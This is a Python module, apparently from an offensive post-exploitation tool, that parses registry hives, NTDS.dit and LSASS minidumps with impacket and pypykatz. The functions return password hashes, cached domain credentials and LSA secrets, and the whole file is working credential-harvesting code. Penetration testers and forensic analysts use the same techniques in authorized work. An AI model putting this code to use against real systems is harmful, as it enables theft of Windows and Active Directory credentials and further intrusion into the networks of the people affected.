"""Local parsing helpers for ephemeral credential-dump byte streams."""

import os
import tempfile
from pathlib import Path
from typing import Dict, Iterable, List

from impacket.examples.secretsdump import LocalOperations, LSASecrets, NTDSHashes, SAMHashes


def _write_private(path: Path, data: bytearray) -> None:
    flags = os.O_CREAT | os.O_EXCL | os.O_WRONLY
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    fd = os.open(path, flags, 0o600)
    try:
        with os.fdopen(fd, "wb") as handle:
            fd = -1
            handle.write(data)
    finally:
        if fd >= 0:
            os.close(fd)


def _stringify_secret(secret_type, value, enum_type=None) -> str:
    label = getattr(secret_type, "name", "")
    if not label and enum_type is not None:
        try:
            label = enum_type(secret_type).name
        except (TypeError, ValueError):
            pass
    if not label:
        label = str(secret_type)
    if isinstance(value, bytes):
        rendered = value.decode("utf-8", errors="replace")
    else:
        rendered = str(value)
    return f"[{label}] {rendered}" if label else rendered


def parse_registry_artifacts(mode: str, artifacts: Dict[str, bytearray]) -> List[str]:
    """Extract printable SAM/LSA or NTDS records from streamed hive bytes."""
    normalized = {name.upper(): value for name, value in artifacts.items()}
    if "SYSTEM" not in normalized:
        raise ValueError("SYSTEM hive is required for offline secret extraction")
    if mode == "sam" and "SAM" not in normalized:
        raise ValueError("SAM hive is required for SAM extraction")
    if mode == "ntds" and "NTDS.DIT" not in normalized:
        raise ValueError("ntds.dit is required for NTDS extraction")
    if mode not in {"sam", "ntds"}:
        raise ValueError(f"unsupported registry dump mode: {mode}")

    records: List[str] = []
    with tempfile.TemporaryDirectory(prefix="pwnrm-dump-") as directory:
        temp_dir = Path(directory)
        try:
            os.chmod(temp_dir, 0o700)
        except OSError:
            pass
        paths: Dict[str, Path] = {}
        for name, data in normalized.items():
            path = temp_dir / name.lower()
            _write_private(path, data)
            paths[name] = path

        local_ops = LocalOperations(str(paths["SYSTEM"]))
        boot_key = local_ops.getBootKey()
        if mode == "sam":
            sam = SAMHashes(
                str(paths["SAM"]),
                boot_key,
                isRemote=False,
                perSecretCallback=lambda value: records.append(str(value)),
            )
            try:
                sam.dump()
            finally:
                sam.finish()

            security_path = paths.get("SECURITY")
            if security_path is not None:
                lsa = LSASecrets(
                    str(security_path),
                    boot_key,
                    isRemote=False,
                    perSecretCallback=lambda secret_type, value: records.append(
                        _stringify_secret(secret_type, value, LSASecrets.SECRET_TYPE)
                    ),
                )
                try:
                    lsa.dumpCachedHashes()
                    lsa.dumpSecrets()
                finally:
                    lsa.finish()
        else:
            no_lm_hash = local_ops.checkNoLMHashPolicy()
            local_domain_sid = NTDSHashes.getLocalDomainSid(str(paths["NTDS.DIT"]))
            ntds = NTDSHashes(
                str(paths["NTDS.DIT"]),
                boot_key,
                isRemote=False,
                noLMHash=no_lm_hash,
                useVSSMethod=True,
                localDomainSid=local_domain_sid,
                perSecretCallback=lambda secret_type, value: records.append(
                    _stringify_secret(secret_type, value, NTDSHashes.SECRET_TYPE)
                ),
            )
            try:
                ntds.dump()
            finally:
                ntds.finish()
    return records


def parse_lsass_minidump(data: bytearray) -> List[str]:
    """Parse an LSASS minidump directly from memory and return grep-style rows."""
    from pypykatz.pypykatz import pypykatz

    parsed = pypykatz.parse_minidump_bytes(data)
    return [line for line in parsed.to_grep().splitlines() if line.strip()]


def zeroize(buffers: Iterable[bytearray]) -> None:
    for buffer in buffers:
        buffer[:] = b"\x00" * len(buffer)
